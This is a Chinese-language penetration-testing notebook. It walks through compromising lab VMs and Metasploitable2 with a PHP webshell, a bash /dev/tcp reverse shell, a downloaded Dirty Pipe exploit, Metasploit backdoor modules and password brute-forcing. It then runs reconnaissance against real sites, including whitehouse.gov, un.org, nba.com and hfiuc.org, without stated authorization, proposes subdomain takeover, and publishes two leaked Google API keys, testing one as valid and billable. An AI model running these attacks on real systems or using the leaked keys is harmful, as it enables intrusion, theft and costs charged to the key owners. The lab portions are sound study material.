
# 靶机渗透
### 外围打点
1. 使用kali的端口扫描工具nmap,判断靶机地址的ip地址![](./image/16.png)其中192.168.221.1通常是网关，130/131更可能是靶机，扫一下131的端口![](./image/17.png)Host is up (存活状态) MAC地址是VMware,确认是虚拟机，即靶机，发现存在80端口，通过ip访问web界面`192.168.221.131:80`进入界面![](./image/18.png)查看一下端口信息![](./image/19.png)
### 信息收集
接下来进行目录扫描，看有什么泄露的东西![](./image/20.png)扫到了robots.txt和graffiti.php,graffiti.txt个文件(因为之前网络连接问题，把NAT模式改为仅主机模式，ip地址变了)，依次访问![](./image/21.png)![](./image/22.png)发现提交的内容都到graffiti.txt里了，也可以在graffiti.php界面看到，抓个包看看![](./image/23.png)
### 拿shell
可以看到file和message都是可控的，可以写入一句话木马![](./image/24.png),也可以将一句话木马改为`<?php @eval($_GET['cmd']);?>`这样不用蚁剑也可以看目录，因为我的kali好像没有蚁剑，接着访问1.php![](./image/25.png)找到flag,继续可以利用漏洞反弹shell,注入一段代码`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.159.129/6666 0>&1'"); ?>` 其中/bin/bash调用系统的 Bash shell。`-c '...'`告诉bash执行单引号内的命令字符串，`bash -i`在子shell里创建一个交互式Bash会话,`>& /dev/tcp/192.168.159.129/7777`/dev/tcp/IP/PORT 是一个特殊的设备文件，它会尝试与指定的 IP 和端口建立一个 TCP 连接。其中`192.168.159.129`是攻击机kali的ip . `>&` 表示将标准输出（`stdout`，文件描述符 1）和标准错误（`stderr`，文件描述符 2）都重定向到这个 TCP 连接。- **`0>&1`**: 这表示将标准输入（`stdin`，文件描述符 0）也重定向到标准输出（也就是那个 TCP 连接）。提前将7777端口监听起来，`nc -lvp 7777`,注入的代码要url编码![](./image/26.png)上传成功后可以访问上传的文件，这时就监听到了![](./image/27.png)这时就可以进行很多操作了，看文件，看目录等.
### 提权
虽然拿到shell,但还是一个www-data的普通用户，没有root权限，要试着提权，看一下有哪写可以suid提权`find / -user root -perm -4000 -print 2>/dev/null`得到![](./image/28.png)没有什么好用的，可以看一下版本`uname -a`![](./image/29.png)这个正好可以利用CVE-2022-0847 Linux内核提权漏洞,参考[文章](https://blog.csdn.net/weixin_39190897/article/details/123976036?ops_request_misc=&request_id=&biz_id=102&utm_term=cve-2022-0847%E5%A4%8D%E7%8E%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-123976036.142^v102^pc_search_result_base5&spm=1018.2226.3001.4187)
在kali上下载漏洞利用`git clone https://github.com/imfiver/CVE-2022-0847.git`
但我一直克隆不下来，我自己建立了一个目录，和文件，把内容复制粘贴进去了。在kali里cd到我放漏洞利用文件的目录，再在当前目录启动http服务`python3 -m http.server 8000`![](./image/30.png)这个服务开着，接下来到反弹shell的那个界面，让靶机下载里面的文件`wget http://192.168.159.129:8000/Dirty-Pipe.sh` ls一下看是否下载成功，下载成功了，接下来赋权，`chmod +x Dirty-Pipe.sh`,然后执行`bash Dirty-Pipe.sh`,输入whoami,root权限拿到![](./image/31.png)![](./image/32.png)如果想知道靶机密码的话可以`cd /etc/shadow` 这里存储着用户密码，只不过不是明文，需要破解，但是已经拿到root了，就没必要了
# metasploitable2靶机渗透
### 信息收集
判断靶机ip,扫描到的前提是kali和靶机在同一网段，靶机配置[教程](https://blog.csdn.net/weixin_40228200/article/details/125089545?ops_request_misc=elastic_search_misc&request_id=00e8deb466cf11824e4e9e66824498cd&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125089545-null-null.142^v102^pc_search_result_base5&utm_term=Metasploitable&spm=1018.2226.3001.4187).
![](./image/33.png)
看到有许多开放端口，看右下角(VMware),可以判断这个192.168.159.190就是靶机ip了。
### 端口渗透
**6667-UnreallRCd 后门漏洞**
先在kali中执行msfconsole,启动metasploit
再执行`search irc`得到的找到![](./image/34.png),使用`use exploit/unix/irc/unreal_ircd_3281_backdoor`进入对应模块，`show options`查看配置![](./image/35.png)`set`查看设置信息![](./image/36.png)设置主机名，进行漏洞利用，exploit攻击，其中rhost为靶机的ip,但攻击失败了，需要payload,![](./image/37.png)用`show payloads`看有哪些可用payloads,![](./image/38.png)其中`payload/cmd/unix/bind_perl`可以在目标主机上开一个TCP端口，通过perl反弹shell,设置payload`set payload cmd/unix/bind_perl` 可以`set 你想要的端口` 也可以不改，默认4444，接下来run,然后得到shell,就可以愉快的执行命令了![](./image/39.png)![](./image/40.png)
试一下whoami,直接是root![](./image/41.png)
**Vsftpd源码包后门漏洞**：一个非常典型的**供应链攻击**案例，即攻击者通过污染上游的软件源码，从而影响所有使用该源码的下游用户。
先在kali中执行msfconsole,启动metasploit，先`nmap -A -sT -Pn 192.168.159.190`![](./image/46.png)发现FTP是2.3.4,这正是存在恶意后门漏洞的版本,再`search vsftpd`寻找和该服务有关的模块![](./image/47.png)选择exploit模块进行渗透,`use exploit/unix/ftp/vsftpd_234_backdoor`进入该漏洞模块的环境，但显示no payloads![](./image/48.png)接下来`show payloads`![](./image/49.png)发现只有一个攻击载荷，就默认了，所以就不用`set payloads cmd/unix/interact`了，直接`show options`看一下配置,![](./image/50.png)发现只用填rhosts就行了，接下来`set rhosts 192.168.159.190`然后run,得到root了
**telnet-弱密码**:`use auxiliary/scanner/telnet/telnet_login`,然后`set rhosts 192.168.159.190`接下来`set username msfadmin`或者指定用户名字典`set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt`,然后指定密码字典`set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`,如果不是默认端口的话，需要修改为默认telnet端口23`set report 23`,最后run开始爆破，最后爆破出用户密码为msfadmin/msfadmin
**ssh-弱密码**:先`use auxiliary/scanner/ssh/ssh_login`，再`set rhosts 192.168.159.190` `set username msfadmin` 
设置密码字典`set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`或者如果知道密码的话`set password msfadmin`,接下来`run`,找到正确密码为msfadmin,找到密码后使用目标凭证登录目标主机`ssh msfadmin@192.168.159.190`但报错`Unable to negotiate with 192.168.159.190 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss`这是SSH 登录时的密钥类型不匹配错误，核心原因是目标服务器（旧系统，如 Metasploitable）仅支持`ssh-rsa`/`ssh-dss`密钥类型，而本地新 SSH 客户端默认禁用了这些老旧密钥类型。直接在命令中指定允许`ssh-rsa`密钥类型`ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.159.190` 接下来输入密码登录就行了，这样实现对靶机的远程登录。
**3306-mysql-弱密码**：`use auxiliary/scanner/mysql/mysql_login`,这个用户是root,密码为空，不能用爆破，有密码可以爆破，可以这样执行sql指令`set RHOSTS 192.168.159.190` `set USERNAME root` `set PASSWORD ` `set SQL "select version();"` `run`执行sql指令
**5423-postgresql弱密码**:爆破密码`use auxiliary/scanner/postgres/postgres_login` `set USERNAME postgres`
`set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt` run执行爆破,找到密码为postgresql,再退出msfconsole,`hydra -l postgres -p postgres -vV -T 3 postgres://192.168.159.190`显示`[5432][postgres] host: 192.168.159.190   login: postgres   password: postgres`表示成功了，再`psql -U postgres -h 192.168.159.190`输入密码则登录成功，可以执行命令了
**5900-VNC-弱密码**：VNC认证通常只需要密码，因此 `USERNAME` 参数可以留空，其余同上，密码字典用`set PASS_FILE /usr/share/wordlists/metasploit/vnc_passwords.txt`
爆破到密码,再退出msfconsole，输入`vncviewer 192.168.159.190`输入密码登录成功，补充：VNC “Virtual Network Console”虚拟网络控制台，远程控制工具软件，是基于 UNIX 和 Linux 操作系统的免费的开源软件，在 Linux 中，VNC 包括以下四个命令：vncserver，vncviewer，vncpasswd，和 vncconnect。大多数情况下用户只需要其中的两个命令：vncserver 和 vncviewer。
**139/445-Samba MS-RPC Shell命令注入漏洞**：先`use auxiliary/admin/smb/samba_symlink_traversal` 
也可以`use exploit/unix/misc/distcc_exec`和`use exploit/multi/samba/usermap_script`
`set rhost 192.168.159.190`  `set payload cmd/unix/bind_perl` `show options`可以看到不仅要填rhost还要填SMBSHARE,`nmap --script smb-enum-shares.nse -p 445 192.168.159.190`看一下有哪些可以用，找一个支持匿名访问，并且可以创建符号链接的，tmp符合，所以`set SMBSHARE tmp`,再run,`smbclient //192.168.159.190/tmp -N` -N表示匿名访问，然后登录成功
**1099-Java RMI SERVER 命令执行漏洞**:Java RMI Serve 的 RMI 注册表和 RMI 激活服务的默认配置存在安全漏洞，可被利用导致代码执行,`use exploit/multi/misc/java_rmi_server`  `show payloads` `set rhost 192.168.159.190`  `set payload java/shell/reverse_tcp`(用来反弹shell)  `run`得到shell
**3632-Distcc 后门漏洞**:Distcc 用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是 xcode1.5 版本及其他版本的 distcc2.x 版本配置对于服务器端口的访问不限制。`search distcc_exec`  `use exploit/unix/misc/distcc_exec`  `set rhost 192.168.159.190` run得到shell
**80-PHP CGI 参数注入执行漏洞**:CGI脚本没有正确处理请求参数，导致源代码泄露，允许远程攻击者在请求参数中插入执行命令。server API 是CGI方式运行的，这个方式在PHP存在漏洞-Cgi参数注入，`use exploit/multi/http/php_cgi_arg_injection`  `set rhost 192.168.159.190`  ,但还要`set lhost 192.168.159.129`否则默认lhost默认为127.0.0.1(本地回环地址),这会导致目标主机无法连接到攻击机，回环地址仅本机可达，最后run
**1524-Ingreslock 后门漏洞**:1524-Ingreslock 后门漏洞是一类依托 Ingres 数据库锁定服务对应的 1524 端口形成的高危后门漏洞，常被攻击者用于非法获取目标系统最高权限，在老旧 Unix、Linux 系统及部分未及时更新的设备中风险较高,Ingreslock 后门程序监听在1524端口，连接到1524端口就可以直接获得root权限,`telnet 192.168.159.190 1524` 得到root权限
**8180-Apache Tomcat弱口令**：先`nmap -sV 192.168.159.190`看到`8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1`说明8180端口开放着并运行着tomcat,再`use auxiliary/scanner/http/tomcat_mgr_login`  `set rhost 192.168.159.190`  `set rport 8180`  run得到用户密码为tomcat/tomcat,
`use exploit/multi/http/tomcat_mgr_deploy` 配置一下后`set httpusername tomcat`  `set httppassword tomcat` run执行成功
**2049-Linux NFS共享目录配置漏洞**：原理： NFS服务配置漏洞赋予了根目录远程可写权限，导致`/root/.ssh/authorized_keys` 可被修改，实现远程ssh无密码登录，`showmount -e 192.168.159.190`回显`Export list for 192.168.159.190:/ *`表示靶机共享了`/`目录，允许所有 IP（`*`）以读写（`rw`）权限访问，`mount -t nfs 192.168.159.190:/ /tmp/test`把192.168.159.190的根目录挂载到/tmp/test/下,`cat /root/.ssh/id_rsa.pub>>/tmp/test/root/.ssh/authorized_keys`，把生成的公钥追加到靶机的authorized_keys下,`ssh -o HostKeyAlgorithms=+ssh-rsa root@192.168.159.190`，实现无密码登录
# 实战渗透
### 外围打点
对白宫官网(http://whitehouse.gov)渗透，先使用`subfinder -d whitehouse.gov -all >domain1.txt`查找一下子域名，再使用`assetfinder whitehouse.gov -subs-only>domain2.txt`查找一下子域名，`cat domain2.txt|wc -l`发现assetfinder找到123个子域名，`cat domain1.txt|wc -l`发现subfinder找到80个子域名，其中肯定有重复的，接下来排一下序，`sort -u domain1.txt domain2.txt >domains.txt` 再`cat domains.txt|wc -l`发现有105个，接下来使用httpx资产探测工具去探测所有子域名`cat domains.txt |httpx -sc -title -web-server -tech-detect > status.txt`再`cat status.txt`发现虽然105个，但是响应码为200的很少![](./image/51.png)再筛选一下200的`cat status.txt|grep "200"`看到很多都是云服务，联想到可能有云泄露，用`subzy run --targets domain2.txt`全部跑一遍云，看是否有子域名接管漏洞，发现有两个VULNERABLE脆弱的域名，分别是url4763.email.politicopro.com和email.editor.flyovernorthcarolina.com,在浏览器访问一下，都是404，因为没有注册,可以试一下注册这两个子域名来子域名接管。![](./image/52.png)![](./image/53.png)
接下来用一下POC-bomber打高危漏洞(漏扫),`cd POC-bomber` `cp domains.txt POC-bomber`把文件复制到POC-bomber里，但这时直接用还是不行的，因为文件里的域名都没有http://开头，需要修改一下，统一加上http://开头，再`python3 pocbomber.py -f domains.txt`，扫的有些慢，可以先用finger扫描一下高危指纹，`python3 Finger.py -f domains.txt`扫到这些![](./image/54.png)如果是wordpress(全球最流行的开源内容管理系统（CMS），基于 PHP 和 MySQL 构建，广泛用于搭建博客、企业官网、电商平台等)的话可以用wpsacn(wordpress漏洞利用工具)扫描一下，
# 实战渗透
对联合国官网un.org,先用`subfinder -d un.org -all>domain1.txt`扫一下子域名，再用`curl -s https://crt.sh/\?q\=\un.org\&output\=json | jq -r '.[].name_value'|grep -Po '(\w+\.\w+\.\w+)$'>domain2.txt`扫一下子域名，其中`https://crt.sh`可以扫描到许多工具难以发现的或者被遗弃的子域名,再将扫描的结果合并一下`sort -u domain1.txt domain2.txt >domains.txt`用httpx资产探测工具探测一下`httpx -l domains.txt -ports 443,80,8000,8080,8888 -threads 300>subdomain_alive.txt`探测所有443.80.8080.8000,8888端口的以及线程为300的，如果端口开放可以进行目录扫描，![](./image/55.png)扫到有29个，接下来用`dirsearch -l subdomain_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt`扫一下目录，排除响应码为500,502,429,404,400的，-R表示递归，5深层扫描，![](./image/56.png)再开一个爬虫爬取JS，利用JS去发现敏感信息`katana -list subdomain_alive.txt --silent -o params.txt`![](./image/57.png)
`cat params.txt|wc -l`有两千多个，使用uro给去一下重，规范格式，`cat params.txt|uro -o file.txt`去重之后还有一千多个，再筛选一下JS,`cat file.txt|grep ".js$">jsfile.txt`筛选出一.js结尾的，最后筛出七十多个，最后针对这七十多个进行打点，利用secretfinder`cat jsfile.txt |while read url;do python3 /home/kali/Desktop/SecretFinder/SecretFinder.py -i $url -o cli >>js_secret.txt;done`批量读取`jsfile.txt`中的每个 JS 文件 URL，调用 SecretFinder 扫描并将结果追加到`js_secret.txt`，是Web 渗透中批量挖掘 JS 敏感信息![](./image/58.png),有可能会扫描出一些云的API KEY,但我这里好想没扫到，只有一些authorization_basic,内容还是空的，没看到明显可以利用的漏洞，接下来可以试一下nuclei来扫描一下漏洞，`nuclei -list params.txt -c 100 -rl 200 -fhr -o nuclei_result.txt`![](./image/59.png),扫出来的东西大都是一些非漏洞相关日志（VER 级别）和`[WRN]`级别的扫描模板参数缺失导致的请求失败，没找到LOW,MEDIUM,HIGH这类提示高中低危漏洞的字眼。
这个没扫到什么东西，我又用相同的方法扫了一下NBA官网(https://www.nba.com/),扫到了 API 密钥、凭证等标识![](./image/60.png)但试了一下，这些api-key好像都是一些无效的密钥![](./image/61.png)
有试了一下[HFI Utility Center](https://www.hfiuc.org/)这个网址，扫目录扫到了一个`http://api.hfiuc.org/redoc`![](./image/62.png)这是 FastAPI 自动生成的 ReDoc 接口文档页面，属于 Web 服务的 API 文档展示界面,可以下载到一个openapi.json的文件和![](./image/63.png)这是 FastAPI 的自动生成的接口文档页面（基于 OAS 3.1 规范），已经直接暴露了几个可用的接口，访问这几个接口可以看到很多泄露的信息，![](./image/65.png)，通过那个json文件，找到一个接口/admin/login,访问是一个管理员登录界面![](./image/64.png)可以找到还有一个/admin/create接口，可以用来提升权限，但访问是404,可以扫一下json漏洞，发现两条google-api-key
~~~
AIzaSyB3d7zlKjhKzKFRQMZq_DXRqp9nwIjpM2Y
AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo
~~~
用[maps.googleapis.com/maps/api/geocode/json?address=Google&key=AIzaSyB3d7zlKjhKzKFRQMZq_DXRqp9nwIjpM2Y](https://maps.googleapis.com/maps/api/geocode/json?address=Google&key=AIzaSyB3d7zlKjhKzKFRQMZq_DXRqp9nwIjpM2Y)和[maps.googleapis.com/maps/api/geocode/json?address=Google&key=AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo](https://maps.googleapis.com/maps/api/geocode/json?address=Google&key=AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo)试了一下，第一个api-key权限受限
```
{
   "error_message" : "This API key is not authorized to use this service or API.",
   "results" : [],
   "status" : "REQUEST_DENIED"
}
```
第二个可以访问,是有价值的
```
{
   "results" : [],
   "status" : "ZERO_RESULTS"
}
```
再用https://maps.googleapis.com/maps/api/place/textsearch/json?query=Google&key=AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo返回
```
{ "html_attributions" : [], "results" : [], "status" : "ZERO_RESULTS" }
```
这个 Key 是有效的，而且启用了付费的 Google Maps / Places API！https://maps.googleapis.com/maps/api/directions/json?origin=NYC&destination=Boston&key=AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo泄露了大量信息，并且可能产生费用
测试了一下Static Maps API，也开启了。通过https://maps.googleapis.com/maps/api/timezone/json?location=40.689247,-74.044502&timestamp=1331161200&key=AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo查到了时区
```
{
   "dstOffset" : 0,
   "rawOffset" : -18000,
   "status" : "OK",
   "timeZoneId" : "America/New_York",
   "timeZoneName" : "Eastern Standard Time"
}
```
用https://maps.googleapis.com/maps/api/distancematrix/json?origins=NYC&destinations=Boston&key=AIzaSyCUZhOtirolbeHMRww_uKlNMlfS-96UYZo查到了
```
{
   "destination_addresses" : 
   [
      "美国麻萨诸塞州波士顿"
   ],
   "origin_addresses" : 
   [
      "美国纽约"
   ],
   "rows" : 
   [
      {
         "elements" : 
         [
            {
               "distance" : 
               {
                  "text" : "348 公里",
                  "value" : 347541
               },
               "duration" : 
               {
                  "text" : "3 小时 41 分钟",
                  "value" : 13250
               },
               "status" : "OK"
            }
         ]
      }
   ],
   "status" : "OK"
}
```